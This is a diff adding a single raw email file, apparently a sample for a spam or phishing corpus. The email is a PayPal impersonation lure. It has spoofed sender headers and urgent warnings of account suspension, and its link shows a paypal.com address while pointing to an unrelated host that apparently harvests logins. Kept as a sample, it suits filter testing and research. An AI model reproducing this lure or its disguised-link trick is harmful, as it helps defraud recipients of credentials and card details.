@@ -1,0 +1,128 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id E98D1468A5
+ for <user@login.example.com>; Fri, 20 Apr 2007 21:02:55 -0400 (EDT)
+X-Greylist: delayed 9945 seconds by postgrey-1.27 at mail.example.org;
+ Fri, 20 Apr 2007 21:02:55 EDT
+Received: from 192.168.50.6 (unknown [65.102.30.154])
+ by mail.example.org (Postfix) with SMTP id 89671131FA3F
+ for <user@example.com>; Fri, 20 Apr 2007 21:02:55 -0400 (EDT)
+Received: from  by web.mail.yahoo.com; Fri, 20 Apr 2007 21:04:13 -0500
+Message-ID: <TPIBEZVSGAIUFSPRJTTRXIVP@hotmail.com>
+From: "service@paypal.com" <service@paypal.com>
+To: user@example.com
+Subject: Account Review 
+Date: Sat, 21 Apr 2007 03:07:13 +0100
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--"
+X-CS-IP: 
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1150
+
+----
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<a rel=3D"nofollow" target=3D"_blank" href=3D"https://www.paypal.com/us"><=
+img src=3D"http://images.paypal.com/en_US/i/logo/email_logo.gif" alt=3D"Pa=
+yPal" border=3D"0" height=3D"35" width=3D"255"></a>
+ 
+
+
+
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" height=3D"316" wid=
+th=3D"750"><tbody><tr>
+<td background=3D"http://images.paypal.com/images/bg_clk.gif" height=3D"29=
+" width=3D"750"><img src=3D"http://images.paypal.com/images/pixel.gif" bor=
+der=3D"0" height=3D"29" width=3D"1"></td>
+</tr>
+<tr>
+<td height=3D"287" width=3D"750"><b><img src=3D"http://images.paypal.com/i=
+mages/pixel.gif" border=3D"0" height=3D"10" width=3D"1">PayPal is committe=
+d to maintaining a safe environment for
+    its community of customers. To protect the security of your account, P=
+ayPal
+    employs some of the most advanced security systems in the world and ou=
+r
+    anti-fraud teams regularly screen the PayPal system for unusual activi=
+ty.
+    <br>
+    <br>
+    We are contacting you to remind you that our Account Review
+    Team identified some unusual activity in your account. In accordance w=
+ith
+    PayPal's User Agreement and to ensure that your account has not been
+    compromised, access to your account was limited. Your account access w=
+ill
+    remain limited until this issue has been resolved.<br>
+    <br>
+    To secure your account and quickly restore full access, we may require=
+ some
+    additional information from you for the following reason:<br>
+    <br>
+    We have been notified that a card associated with your account has bee=
+n
+    reported as lost or stolen, or that there were additional problems wit=
+h your
+    card.<br>
+    <br>
+    <br>
+    This process is mandatory, and if not completed within the nearest tim=
+e your
+    account or credit card may be subject for temporary suspension. <br>
+    <br>
+    To securely confirm your PayPal information please click on the link b=
+ellow:<br>
+    <br>
+    <br>
+    <br>
+    <a rel=3D"nofollow" target=3D"_blank" href=3D"http://server.biemilac.c=
+om/images/.9999/www.paypal.com3/www.paypal.com/cgi-bin/webscr_cmd=3D_login=
+-run/index.html"><span style=3D"background: transparent none repeat scroll=
+ 0% 50%; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-=
+initial; -moz-background-inline-policy: -moz-initial;" id=3D"lw_1177017257=
+_0">https://www.paypal.com/cgi-bin/webscr?cmd=3D_login-run</span></a><br>
+    <br>
+    <br>
+    <br>
+    We encourage you to log in and perform the steps necessary to restore =
+your
+    account access as soon as possible. Allowing your account access to re=
+main
+    limited for an extended period of time may result in further limitatio=
+ns on
+    the use of your account and possible account closure.<br>
+    <br>
+    For more information about how to protect your account please visit Pa=
+yPal
+    Security Center. We apologize for any incovenience this may cause, and=
+ we
+    apriciate your assistance in helping us to maintain the integrity of t=
+he
+    entire PayPal system.<br>
+    <br>
+    <br>
+    <br>
+    Thank you for using PayPal!<br>
+    The PayPal Team</b><br>
+&nbsp;</td></tr></tbody></table><!-- type =3D text -->
+
+<br><br><p>
+
+
+<!-- toctype =3D X-unknown -->
+<!-- toctype =3D text -->
+<!-- text -->
+
+
+
+
+<!-- END TOC --></p>
+
+------
